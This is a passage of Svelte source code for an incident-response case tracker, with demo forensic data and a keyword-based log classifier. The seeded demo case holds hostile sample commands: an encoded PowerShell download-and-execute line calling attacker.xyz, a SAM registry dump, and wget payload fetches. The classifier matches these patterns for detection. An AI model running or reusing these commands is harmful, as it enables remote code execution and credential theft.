<script lang="ts">
  import { onMount } from 'svelte';
  import LandingPage from './components/LandingPage.svelte';
  import Dashboard from './components/Dashboard.svelte';
  import CasesPage from './components/CasesPage.svelte';
  import EvidenceLocker from './components/EvidenceLocker.svelte';
  import NotesEditor from './components/NotesEditor.svelte';
  import AttackChain from './components/AttackChain.svelte';
  import TimelineBuilder from './components/TimelineBuilder.svelte';
  import ReportSystem from './components/ReportSystem.svelte';
  import type { Case, TimelineEvent, Finding, Evidence, CaseNote, CaseSeverity, CaseStatus } from './types';
  import { 
    Shield, 
    ChevronRight,
    RefreshCw,
    UploadCloud, 
    X, 
    Info,
    CheckCircle,
    AlertCircle,
    Sparkles,
    LogOut,
    ClipboardList,
    FileText
  } from 'lucide-svelte';

  const initialClientDatabase = {
    cases: [
      {
        id: "case-demo-01",
        title: "Operation Frostbite: DevOps Host Compromise",
        description: "An intrusion detection alert triggered by unusual remote PowerShell execution and unauthorized software installation on developer laptop WS-DOE-92.",
        severity: "Critical" as CaseSeverity,
        status: "Investigating" as CaseStatus,
        createdAt: "2026-06-22T08:30:00Z",
      },
      {
        id: "case-demo-02",
        title: "Suspicious API Ingress - Financial Service Gateway",
        description: "An investigation into multiple credential-stuffing attempts resulting in API rate limits being reached on the public payment router ingress.",
        severity: "Medium" as CaseSeverity,
        status: "Open" as CaseStatus,
        createdAt: "2026-06-21T14:15:00Z",
      },
    ],
    events: [
      {
        id: "evt-01",
        caseId: "case-demo-01",
        timestamp: "2026-06-22T09:01:00",
        event: "User Login Success",
        description: "User 'j.doe' successfully authenticated via external VPN IP 198.51.100.42. Historically, logins for this user only originate from local segment 10.12.0.0/16.",
        severity: "Low" as CaseSeverity,
        category: "Initial Access",
        isSuspicious: true,
        notes: "Logins should be restricted to local IP block or corporate proxies. Needs verification with HR relative to travel status.",
        techniqueId: "T1078.001",
        techniqueName: "Valid Accounts: Default Accounts",
      },
      {
        id: "evt-02",
        caseId: "case-demo-01",
        timestamp: "2026-06-22T09:05:00",
        event: "PowerShell Execution",
        description: "PowerShell spawned with arguments: powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAHgAeQB6AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
        severity: "Critical" as CaseSeverity,
        category: "Execution",
        isSuspicious: true,
        notes: "Decoded base64 payload points to: IEX(New-Object Net.WebClient).DownloadString('http://attacker.xyz/payload.ps1'). This is standard beacon staging behavior.",
        techniqueId: "T1059.001",
        techniqueName: "Command and Scripting Interpreter: PowerShell",
      },
      {
        id: "evt-03",
        caseId: "case-demo-01",
        timestamp: "2026-06-22T09:07:00",
        event: "Suspicious Download",
        description: "Binary download detected from remote URL http://attacker.xyz/binaries/network_scan.exe, saved local to C:\\Users\\Public\\Downloads\\network_scan.exe.",
        severity: "High" as CaseSeverity,
        category: "Command and Control",
        isSuspicious: true,
        notes: "File download matches custom network reconnaissance toolkit payload signatures. MD5 Hash verified as malicious.",
        techniqueId: "T1105",
        techniqueName: "Ingress Tool Transfer",
      },
      {
        id: "evt-04",
        caseId: "case-demo-01",
        timestamp: "2026-06-22T09:11:00",
        event: "Privilege Escalation",
        description: "Command prompt elevated to NT AUTHORITY\\SYSTEM using registry dump helper tool and SAM hives exported as reg save HKLM\\SAM SAM.hiv.",
        severity: "High" as CaseSeverity,
        category: "Credential Access",
        isSuspicious: true,
        notes: "Attempted harvesting of local LSASS security credentials. Attacker succeeded in generating registry structures.",
        techniqueId: "T1003.002",
        techniqueName: "OS Credential Dumping: Security Account Manager",
      },
      {
        id: "evt-05",
        caseId: "case-demo-01",
        timestamp: "2026-06-22T09:15:00",
        event: "Data Exfiltration Attempt",
        description: "High volume outbound transfer of 4.8 GB of sensitive customer source code directories over port 443 HTTPS redirected to cloud storage service mega.co.nz.",
        severity: "Critical" as CaseSeverity,
        category: "Exfiltration",
        isSuspicious: true,
        notes: "The egress channel matches exfiltration signatures. Incident declared. Target workstation has been isolated from network infrastructure.",
        techniqueId: "T1048.003",
        techniqueName: "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-Web Protocol",
      },
    ],
    evidence: [
      {
        id: "ev-01",
        caseId: "case-demo-01",
        title: "Malicious PowerShell command text snippet",
        fileUrl: "powershell_encoded_payload.txt",
        type: "text/plain",
        size: "348 B",
        uploadedAt: "2026-06-22T09:30:00Z",
        tag: "Indicators",
      },
      {
        id: "ev-02",
        caseId: "case-demo-01",
        title: "DevOps laptop process tree screenshot",
        fileUrl: "ws_doe_process_tree.png",
        type: "image/png",
        size: "1.2 MB",
        uploadedAt: "2026-06-22T09:32:00Z",
        tag: "Screenshots",
      },
    ],
    findings: [
      {
        id: "find-01",
        caseId: "case-demo-01",
        title: "Suspicious PowerShell Execution (Base64)",
        description: "An analyst detected PowerShell command execution utilizing Base64 encoding. It bypassed the default execution policy to directly download and execute remote attacker payload files.",
        severity: "Critical" as CaseSeverity,
        confidence: 95,
        reason: "Matched automated finding rule. High confidence due to encoded command downloading directly from http://attacker.xyz.",
        createdAt: "2026-06-22T09:20:00Z",
        techniqueId: "T1059.001",
      },
      {
        id: "find-02",
        caseId: "case-demo-01",
        title: "OS Credential Registry Harvesting (SAM Export)",
        description: "Exporting Security Account Manager (SAM) registry structures to file system in public access directories was detected, revealing active lateral movement.",
        severity: "High" as CaseSeverity,
        confidence: 88,
        reason: "Attempted execution of reg save on sensitive password storage registry keys.",
        createdAt: "2026-06-22T09:22:00Z",
        techniqueId: "T1003.002",
      },
      {
        id: "find-03",
        caseId: "case-demo-01",
        title: "Mass Corporate Exfiltration to Public Servers",
        description: "An asset sent 4.8 GB of outbound encryption streams towards Mega.co.nz cloud storage infrastructure, outside business bounds.",
        severity: "Critical" as CaseSeverity,
        confidence: 99,
        reason: "Identified via network log matching known file sharing services combined with workstation isolation context.",
        createdAt: "2026-06-22T09:25:00Z",
        techniqueId: "T1048",
      },
    ],
    notes: [
      {
        id: "note-demo-01",
        caseId: "case-demo-01",
        content: `# Operational Incident Response Notes\n\n## 🚨 Current Summary of Workstation WS-DOE-92\nAt **09:01 AM**, user \`j.doe\` signed in using external credentials. We flagged this because VPN telemetry registers this access from a blacklisted residential proxy block.\n\nAt **09:05 AM**, the intruder ran a base64 encoded PowerShell beacon inside our DevOps dev segment, initiating connection download staging towards \`http://attacker.xyz/payload.ps1\`.\n\n## 🛠️ Actions Taken:\n1. Isolated workstation WS-DOE-92 immediately using our hypervisor security tools (Virtual LAN Quarantine).\n2. Suspended DevOps active domain accounts for \`j.doe\`.\n3. Harvested forensic images of local RAM and registries.\n4. Traced file download network headers to pinpoint exfiltration channels.\n\n*Note: Large exfiltration events occurred towards mega.co.nz at 09:15 AM. Executive forensics team has been looped in to notify customers of source code directory exposure.*`,
        updatedAt: "2026-06-22T10:00:00Z",
      },
    ],
  };

  // Views & Routing State
  let currentView = $state<"landing" | "app">("landing");
  let appTab = $state<"dashboard" | "cases" | "workspace">("dashboard");
  let workspaceSubTab = $state<"timeline" | "report">("timeline");

  // Core Data Lists
  let cases = $state<Case[]>([]);
  let activeCaseId = $state<string>("case-demo-01");
  let activeCaseDetails = $state<{
    id: string;
    title: string;
    description: string;
    severity: CaseSeverity;
    status: CaseStatus;
    events: TimelineEvent[];
    evidence: Evidence[];
    findings: Finding[];
    notes: CaseNote;
  } | null>(null);

  // Status & Utility States
  let loadingCases = $state(false);
  let loadingDetails = $state(false);
  let toastMessage = $state<{ type: "success" | "info" | "warn"; text: string } | null>(null);
  let interactiveLogText = $state("");
  let isStaticMode = $state(false);

  let ingestionTab = $state<"upload" | "paste">("upload");
  let uploadDragActive = $state(false);
  let lastParsedReport = $state<{
    fileName: string;
    totalLines: number;
    threatsCount: number;
    compliantCount: number;
    events: any[];
  } | null>(null);

  function triggerToast(text: string, type: "success" | "info" | "warn" = "success") {
    toastMessage = { type, text };
    setTimeout(() => {
      toastMessage = null;
    }, 4500);
  }

  function getLocalDb() {
    const localDbStr = localStorage.getItem("iris_local_db");
    if (!localDbStr) {
      localStorage.setItem("iris_local_db", JSON.stringify(initialClientDatabase));
      return initialClientDatabase;
    }
    try {
      return JSON.parse(localDbStr);
    } catch {
      localStorage.setItem("iris_local_db", JSON.stringify(initialClientDatabase));
      return initialClientDatabase;
    }
  }

  function saveLocalDb(db: any) {
    localStorage.setItem("iris_local_db", JSON.stringify(db));
  }

  // Fetch Cases list
  async function fetchCasesList() {
    loadingCases = true;
    try {
      const res = await fetch("/api/cases");
      if (res.ok) {
        const data = await res.json();
        cases = data;
        isStaticMode = false;
      } else {
        throw new Error("API responded non-OK");
      }
    } catch (err) {
      console.warn("Backend API unavailable, loading from local client storage.", err);
      isStaticMode = true;
      const db = getLocalDb();
      cases = db.cases;
    } finally {
      loadingCases = false;
    }
  }

  // Fetch Specific Case Details
  async function fetchCaseDetails(id: string) {
    if (!id) return;
    loadingDetails = true;
    try {
      if (isStaticMode) {
        loadCaseDetailsStatic(id);
        loadingDetails = false;
        return;
      }

      const res = await fetch(`/api/cases/${id}`);
      if (res.ok) {
        const data = await res.json();
        activeCaseDetails = data;
      } else {
        throw new Error("Detail fetch failed");
      }
    } catch (err) {
      console.error("Error fetching case details from server, fallback to static.", err);
      isStaticMode = true;
      loadCaseDetailsStatic(id);
    } finally {
      loadingDetails = false;
    }
  }

  function loadCaseDetailsStatic(id: string) {
    const db = getLocalDb();
    const caseObj = db.cases.find((c: any) => c.id === id);
    if (caseObj) {
      const events = db.events.filter((e: any) => e.caseId === id);
      const evidence = db.evidence.filter((e: any) => e.caseId === id);
      const findings = db.findings.filter((e: any) => e.caseId === id);
      let notesObj = db.notes.find((n: any) => n.caseId === id);
      if (!notesObj) {
        notesObj = {
          id: `note-${id}`,
          caseId: id,
          content: `# Incident Analysis Notes: ${caseObj.title}\n\nType notes here...`,
          updatedAt: new Date().toISOString()
        };
      }
      activeCaseDetails = {
        ...caseObj,
        events,
        evidence,
        findings,
        notes: notesObj
      };
    }
  }

  onMount(() => {
    fetchCasesList();
  });

  // Track active case shifts
  $effect(() => {
    if (activeCaseId) {
      fetchCaseDetails(activeCaseId);
    }
  });

  // Event Handlers
  function handleCaseSelect(id: string) {
    activeCaseId = id;
    triggerToast(`Switched active investigation workspace to ${id}`, "info");
  }

  function handleLoadDemoCase() {
    currentView = "app";
    appTab = "workspace";
    workspaceSubTab = "timeline";
    activeCaseId = "case-demo-01";
    triggerToast("Loaded demonstration Case file Operation Frostbite. Forensics matrices parsed, S3 locker populated.", "success");
  }

  // Create Case
  async function handleCreateCase(title: string, description: string, severity: CaseSeverity, status: CaseStatus) {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const newCase: Case = {
          id: `case-local-${Date.now()}`,
          title,
          description,
          severity,
          status,
          createdAt: new Date().toISOString()
        };
        db.cases.push(newCase);
        saveLocalDb(db);
        triggerToast(`Incident Case ${newCase.id} created successfully!`, "success");
        await fetchCasesList();
        activeCaseId = newCase.id;
        appTab = "workspace";
        return;
      }

      const res = await fetch("/api/cases", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title, description, severity, status }),
      });
      if (res.ok) {
        const newCase = await res.json();
        triggerToast(`Incident Case ${newCase.id} created successfully!`, "success");
        await fetchCasesList();
        activeCaseId = newCase.id;
        appTab = "workspace";
      }
    } catch (err) {
      console.error(err);
      triggerToast("Failed to initialize security case", "warn");
    }
  }

  // Edit Case Details
  async function handleEditCase(id: string, updates: Partial<Case>) {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.cases = db.cases.map((c: any) => c.id === id ? { ...c, ...updates } : c);
        saveLocalDb(db);
        triggerToast("Incident details updated successfully", "success");
        await fetchCasesList();
        if (activeCaseId === id) {
          fetchCaseDetails(id);
        }
        return;
      }

      const res = await fetch(`/api/cases/${id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(updates),
      });
      if (res.ok) {
        triggerToast("Incident details updated successfully", "success");
        await fetchCasesList();
        if (activeCaseId === id) {
          fetchCaseDetails(id);
        }
      }
    } catch (err) {
      console.error(err);
    }
  }

  // Delete Case
  async function handleDeleteCase(id: string) {
    if (!window.confirm("Are you absolutely sure you want to decommission this investigation case? All related timelines, notes, and evidence will be permanently deleted.")) {
      return;
    }
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.cases = db.cases.filter((c: any) => c.id !== id);
        db.events = db.events.filter((e: any) => e.caseId !== id);
        db.findings = db.findings.filter((f: any) => f.caseId !== id);
        db.evidence = db.evidence.filter((ev: any) => ev.caseId !== id);
        db.notes = db.notes.filter((n: any) => n.caseId !== id);
        saveLocalDb(db);
        triggerToast("Case records deleted cleanly", "success");
        await fetchCasesList();
        if (activeCaseId === id) {
          activeCaseId = "case-demo-01";
        }
        return;
      }

      const res = await fetch(`/api/cases/${id}`, { method: "DELETE" });
      if (res.ok) {
        triggerToast("Case records deleted cleanly from database pools", "success");
        await fetchCasesList();
        if (activeCaseId === id) {
          activeCaseId = "case-demo-01";
        }
      }
    } catch (err) {
      console.error(err);
    }
  }

  // Add Timeline Event
  async function handleAddTimelineEvent(eventData: Partial<TimelineEvent>) {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const newEvent: TimelineEvent = {
          id: `evt-local-${Date.now()}`,
          caseId: activeCaseId,
          timestamp: eventData.timestamp || new Date().toISOString(),
          event: eventData.event || "Manual Event Indicator",
          description: eventData.description || "",
          severity: eventData.severity || "Low",
          category: eventData.category || "General",
          isSuspicious: eventData.isSuspicious ?? true,
          notes: eventData.notes || "",
          techniqueId: eventData.techniqueId || "",
          techniqueName: eventData.techniqueName || ""
        };
        db.events.push(newEvent);
        
        // Auto-create finding if suspicious & high/critical severity
        if (newEvent.isSuspicious && (newEvent.severity === "High" || newEvent.severity === "Critical")) {
          db.findings.push({
            id: `find-local-${Date.now()}`,
            caseId: activeCaseId,
            title: `Indicator Event: ${newEvent.event}`,
            description: newEvent.description,
            severity: newEvent.severity,
            confidence: 85,
            reason: "Manually registered elevated security event.",
            createdAt: new Date().toISOString(),
            techniqueId: newEvent.techniqueId
          });
        }
        
        saveLocalDb(db);
        triggerToast("Custom event mapped into chronologic sequence", "success");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch(`/api/timeline/${activeCaseId}/events`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(eventData),
      });
      if (res.ok) {
        triggerToast("Custom event mapped into chronologic sequence", "success");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  }

  // Delete Timeline Event
  async function handleDeleteTimelineEvent(eventId: string) {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.events = db.events.filter((e: any) => e.id !== eventId);
        saveLocalDb(db);
        triggerToast("Timeline node discarded", "info");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch(`/api/timeline/${activeCaseId}/events/${eventId}`, {
        method: "DELETE",
      });
      if (res.ok) {
        triggerToast("Timeline node discarded", "info");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  }

  // Reorder Timeline events
  async function handleReorderTimeline(reorderedEvents: TimelineEvent[]) {
    // Optimistic Svelte update
    if (activeCaseDetails) {
      activeCaseDetails.events = reorderedEvents;
    }

    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const otherEvents = db.events.filter((e: any) => e.caseId !== activeCaseId);
        db.events = [...otherEvents, ...reorderedEvents];
        saveLocalDb(db);
        return;
      }

      const res = await fetch(`/api/timeline/${activeCaseId}/reorder`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ reorderedEvents }),
      });
      if (!res.ok) {
        throw new Error("Reorder failed on database pools");
      }
    } catch (err) {
      console.error(err);
      triggerToast("Failed to preserve custom chronological sequence", "warn");
      fetchCaseDetails(activeCaseId); // Sync revert
    }
  }

  // Upload Evidence
  async function handleUploadEvidence(title: string, fileType: string, fileContent: string, tag: string, linkedEventId?: string) {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const newEvidence: Evidence = {
          id: `ev-local-${Date.now()}`,
          caseId: activeCaseId,
          title,
          fileUrl: `${title.toLowerCase().replace(/[^a-z0-9]+/g, "_")}.${fileType === "json" ? "json" : "txt"}`,
          type: fileType === "json" ? "application/json" : "text/plain",
          size: `${Math.round(fileContent.length / 10.24) / 100} KB`,
          uploadedAt: new Date().toISOString(),
          tag,
          linkedEventId
        };
        db.evidence.push(newEvidence);
        saveLocalDb(db);
        triggerToast("Forensic asset uploaded securely to Local Storage Locker", "success");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch("/api/evidence/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          title,
          fileType,
          fileContent,
          tag,
          linkedEventId,
        }),
      });
      if (res.ok) {
        triggerToast("Forensic asset uploaded securely mirror to AWS S3 Locker buckets", "success");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  }

  // Remove Evidence
  async function handleRemoveEvidence(evId: string) {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.evidence = db.evidence.filter((e: any) => e.id !== evId);
        saveLocalDb(db);
        triggerToast("Forensic evidence asset discarded cleanly", "info");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch(`/api/evidence/${activeCaseId}/${evId}`, {
        method: "DELETE",
      });
      if (res.ok) {
        triggerToast("Forensic evidence asset discarded cleanly", "info");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  }

  // Save Notes
  async function handleSaveNotes(content: string) {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const existingNoteIdx = db.notes.findIndex((n: any) => n.caseId === activeCaseId);
        if (existingNoteIdx > -1) {
          db.notes[existingNoteIdx].content = content;
          db.notes[existingNoteIdx].updatedAt = new Date().toISOString();
        } else {
          db.notes.push({
            id: `note-local-${Date.now()}`,
            caseId: activeCaseId,
            content,
            updatedAt: new Date().toISOString()
          });
        }
        saveLocalDb(db);
        
        if (activeCaseDetails) {
          activeCaseDetails.notes = {
            ...activeCaseDetails.notes,
            content,
            updatedAt: new Date().toISOString()
          };
        }
        return;
      }

      const res = await fetch(`/api/notes/${activeCaseId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
      });
      if (res.ok) {
        if (activeCaseDetails) {
          activeCaseDetails.notes = {
            ...activeCaseDetails.notes,
            content,
            updatedAt: new Date().toISOString()
          };
        }
      }
    } catch (err) {
      console.error(err);
    }
  }

  // Local log parsing engine for offline static deployments
  function parseLogsClientSide(content: string) {
    const lines = content.split("\n");
    const parsedEvents: any[] = [];
    
    lines.forEach((line, index) => {
      if (!line.trim()) return;
      const lower = line.toLowerCase();
      let event = "Log Event Node";
      let description = line.trim();
      let severity: CaseSeverity = "Low";
      let category = "Security Check";
      let isSuspicious = false;
      let techniqueId = "";
      let techniqueName = "";
      
      if (lower.includes("powershell") || lower.includes("bypass") || lower.includes("-enc")) {
        event = "Suspicious PowerShell Execution";
        isSuspicious = true;
        severity = "Critical";
        category = "Execution";
        techniqueId = "T1059.001";
        techniqueName = "PowerShell Scripting";
      } else if (lower.includes("bad password") || lower.includes("failure") || lower.includes("unauthorized") || lower.includes("denied")) {
        event = "Access Authentication Failure";
        isSuspicious = true;
        severity = "High";
        category = "Credential Access";
        techniqueId = "T1110";
        techniqueName = "Brute Force";
      } else if (lower.includes("elevat") || lower.includes("privilege") || lower.includes("sam.hiv") || lower.includes("registry dump")) {
        event = "Privilege Escalation Alert";
        isSuspicious = true;
        severity = "High";
        category = "Privilege Escalation";
        techniqueId = "T1003.002";
        techniqueName = "OS Credential Dumping";
      } else if (lower.includes("download") || lower.includes("wget") || lower.includes("curl") || lower.includes("attacker.xyz")) {
        event = "Suspicious File Transfer";
        isSuspicious = true;
        severity = "High";
        category = "Command and Control";
        techniqueId = "T1105";
        techniqueName = "Ingress Tool Transfer";
      } else if (lower.includes("mega.co.nz") || lower.includes("exfil") || lower.includes("leak") || lower.includes("outbound")) {
        event = "Data Exfiltration Attempt";
        isSuspicious = true;
        severity = "Critical";
        category = "Exfiltration";
        techniqueId = "T1048";
        techniqueName = "Exfiltration Over Alternative Protocol";
      } else if (lower.includes("success") || lower.includes("mfa verified") || lower.includes("authorized check")) {
        event = "User Login Verification";
        isSuspicious = false;
        severity = "Low";
        category = "Initial Access";
      }

      parsedEvents.push({
        id: `evt-client-${Date.now()}-${index}`,
        caseId: activeCaseId,
        timestamp: new Date().toISOString().substring(0, 19).replace("T", " "),
        event,
        description,
        severity,
        category,
        isSuspicious,
        techniqueId,
        techniqueName,
        notes: isSuspicious ? "Flagged by client-side heuristic engines during static processing." : "Verified compliant under static parsing."
      });
    });
    
    return parsedEvents;
  }

  // Quick preset logger injections
  async function handleQuickInject(logType: string) {
    let mockContent = "";
    let fName = "security_isolated_syslog.txt";

    if (logType === "bruteforce") {
      fName = "active_directory_bruteforce.txt";
      mockContent = `
22:15:01 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
22:15:03 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
22:15:04 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
22:15:07 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
22:15:09 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
22:15:10 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
      `.trim();
    } else if (logType === "ransomware") {
      fName = "firewall_endpoint_alerts.json";
      mockContent = JSON.stringify([
        {
          timestamp: new Date().toISOString().substring(0, 19),
          event: "Suspicious Remote Download",
          description: "Wget trigger detected downloading payload from attacker.xyz/trojan_pack.exe",
          severity: "High",
          category: "Command and Control"
        },
        {
          timestamp: new Date(Date.now() + 100000).toISOString().substring(0, 19),
          event: "Trojan Executable Downloaded",
          description: "Malicious binary trojan_pack.exe unpacked in local temp user registry.",
          severity: "Critical",
          category: "Execution"
        }
      ], null, 2);
    }

    if (isStaticMode) {
      const parsed = parseLogsClientSide(mockContent);
      const db = getLocalDb();
      db.events = [...db.events, ...parsed];
      
      parsed.filter(p => p.isSuspicious).forEach(p => {
        db.findings.push({
          id: `find-local-${Date.now()}-${Math.random()}`,
          caseId: activeCaseId,
          title: `Alert: ${p.event}`,
          description: p.description,
          severity: p.severity,
          confidence: 90,
          reason: "Log ingestion heuristic match.",
          createdAt: new Date().toISOString(),
          techniqueId: p.techniqueId
        });
      });

      saveLocalDb(db);
      triggerToast(`Quick logs loaded! Processed and added ${parsed.length} milestones client-side.`, "success");
      fetchCaseDetails(activeCaseId);
      return;
    }

    try {
      const res = await fetch("/api/logs/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          fileName: fName,
          fileContent: mockContent,
          fileType: fName.endsWith(".json") ? "json" : "txt"
        }),
      });

      if (res.ok) {
        const data = await res.json();
        triggerToast(data.message, "success");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
      triggerToast("Log Injection failed on server interface", "warn");
    }
  }

  // Log Paste form
  async function handleManualLogIngestSubmit(e: SubmitEvent) {
    e.preventDefault();
    if (!interactiveLogText.trim()) return;

    if (isStaticMode) {
      const parsed = parseLogsClientSide(interactiveLogText);
      const db = getLocalDb();
      db.events = [...db.events, ...parsed];

      parsed.filter(p => p.isSuspicious).forEach(p => {
        db.findings.push({
          id: `find-local-${Date.now()}-${Math.random()}`,
          caseId: activeCaseId,
          title: `Pasted Alert: ${p.event}`,
          description: p.description,
          severity: p.severity,
          confidence: 80,
          reason: "Manual paste heuristic analyzer flag.",
          createdAt: new Date().toISOString(),
          techniqueId: p.techniqueId
        });
      });

      saveLocalDb(db);
      const threats = parsed.filter((ev: any) => ev.isSuspicious) || [];
      const compliant = parsed.filter((ev: any) => !ev.isSuspicious) || [];
      lastParsedReport = {
        fileName: "forensics_analyst_pasted_lines.txt",
        totalLines: parsed.length,
        threatsCount: threats.length,
        compliantCount: compliant.length,
        events: parsed
      };

      triggerToast(`Processed locally. Analyzed ${parsed.length} lines.`, "success");
      interactiveLogText = "";
      fetchCaseDetails(activeCaseId);
      return;
    }

    try {
      const res = await fetch("/api/logs/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          fileName: "forensics_analyst_pasted_lines.txt",
          fileContent: interactiveLogText,
          fileType: "txt",
        }),
      });

      if (res.ok) {
        const data = await res.json();
        const threats = data.events?.filter((ev: any) => ev.isSuspicious) || [];
        const compliant = data.events?.filter((ev: any) => !ev.isSuspicious) || [];
        lastParsedReport = {
          fileName: "forensics_analyst_pasted_lines.txt",
          totalLines: (data.events?.length || 0),
          threatsCount: threats.length,
          compliantCount: compliant.length,
          events: data.events || []
        };
        triggerToast(`Manual paste processed successfully. Enrolled ${data.events?.length || 0} event milestones!`, "success");
        interactiveLogText = "";
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
      triggerToast("Manual text parse operation failed.", "warn");
    }
  }

  // Upload Log file handler
  async function handleLogFileUpload(fileName: string, content: string) {
    if (!content.trim()) return;

    if (isStaticMode) {
      const parsed = parseLogsClientSide(content);
      const db = getLocalDb();
      db.events = [...db.events, ...parsed];

      parsed.filter(p => p.isSuspicious).forEach(p => {
        db.findings.push({
          id: `find-local-${Date.now()}-${Math.random()}`,
          caseId: activeCaseId,
          title: `File Alert: ${p.event}`,
          description: p.description,
          severity: p.severity,
          confidence: 85,
          reason: "Log file heuristic parsing trigger.",
          createdAt: new Date().toISOString(),
          techniqueId: p.techniqueId
        });
      });

      saveLocalDb(db);
      const threats = parsed.filter((ev: any) => ev.isSuspicious) || [];
      const compliant = parsed.filter((ev: any) => !ev.isSuspicious) || [];
      lastParsedReport = {
        fileName,
        totalLines: parsed.length,
        threatsCount: threats.length,
        compliantCount: compliant.length,
        events: parsed
      };

      triggerToast(`Log file "${fileName}" processed locally via offline engine.`, "success");
      fetchCaseDetails(activeCaseId);
      return;
    }

    try {
      const res = await fetch("/api/logs/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          fileName,
          fileContent: content,
          fileType: fileName.endsWith(".json") ? "json" : "txt"
        }),
      });

      if (res.ok) {
        const data = await res.json();
        const threats = data.events?.filter((ev: any) => ev.isSuspicious) || [];
        const compliant = data.events?.filter((ev: any) => !ev.isSuspicious) || [];
        lastParsedReport = {
          fileName,
          totalLines: (data.events?.length || 0),
          threatsCount: threats.length,
          compliantCount: compliant.length,
          events: data.events || []
        };
        triggerToast(`Log file "${fileName}" processed successfully.`, "success");
        fetchCaseDetails(activeCaseId);
      } else {
        triggerToast("Failed to process the uploaded file.", "warn");
      }
    } catch (err) {
      console.error(err);
      triggerToast("Network error uploading log file.", "warn");
    }
  }

  const activeCaseObj = $derived(cases.find(c => c.id === activeCaseId) || cases[0]);
</script>

{#if currentView === "landing"}
  <LandingPage onStart={() => currentView = "app"} onLoadDemo={handleLoadDemoCase} />
{:else}
  <div class="min-h-screen bg-zinc-50/50 font-sans text-slate-800 flex flex-col antialiased select-none">
    
    <!-- Toast Notice bar -->
    {#if toastMessage}
      <div id="iris-global-toast" class="fixed bottom-6 right-6 z-50 p-4 rounded-xl shadow-lg border text-xs font-semibold max-w-sm flex items-center gap-3 transition-all duration-300 transform translate-y-0 pulse-soft {
        toastMessage.type === 'success' ? 'bg-emerald-50 text-emerald-950 border-emerald-200' :
        toastMessage.type === 'warn' ? 'bg-red-50 text-red-950 border-red-200' : 'bg-violet-50 text-violet-950 border-violet-200'
      }">
        {#if toastMessage.type === "success"}
          <CheckCircle class="h-4 w-4 text-emerald-600 flex-shrink-0" />
        {:else}
          {#if toastMessage.type === "warn"}
            <AlertCircle class="h-4 w-4 text-rose-600 flex-shrink-0" />
          {:else}
            <Sparkles class="h-4 w-4 text-violet-600 flex-shrink-0" />
          {/if}
        {/if}
        <p>{toastMessage.text}</p>
      </div>
    {/if}

    <!-- Primary header navbar -->
    <header id="app-header" class="bg-white border-b border-slate-200 sticky top-0 z-40 px-6 py-3.5 flex flex-wrap items-center justify-between gap-4">
      <div class="flex items-center gap-2.5">
        <!-- Logo visual launcher -->
        <button 
          id="logo-brand-btn"
          onclick={() => currentView = "landing"}
          class="flex items-center gap-2 text-left hover:opacity-85 transition-opacity cursor-pointer border-none bg-transparent"
        >
          <div class="h-8.5 w-8.5 bg-violet-600 rounded-xl flex items-center justify-center text-white shadow shadow-violet-200 font-bold text-sm">
            <Shield class="h-4.5 w-4.5" />
          </div>
          <div>
            <span class="font-sans font-extrabold text-slate-900 tracking-tight text-sm block">IRIS Incident Studio</span>
            <span class="text-[10px] text-slate-400 font-bold block leading-none font-mono">SOC OPERATION NODE</span>
          </div>
        </button>
        
        <ChevronRight class="h-4 w-4 text-slate-300 hidden sm:inline" />

        <!-- Active Case switching dropdown selector -->
        {#if cases.length > 0}
          <div class="flex items-center gap-1.5 ml-2">
            <span class="text-[10.5px] font-bold text-slate-400 uppercase hidden md:inline">InScope:</span>
            <select
              id="header-case-picker"
              value={activeCaseId}
              onchange={(e) => handleCaseSelect((e.target as HTMLSelectElement).value)}
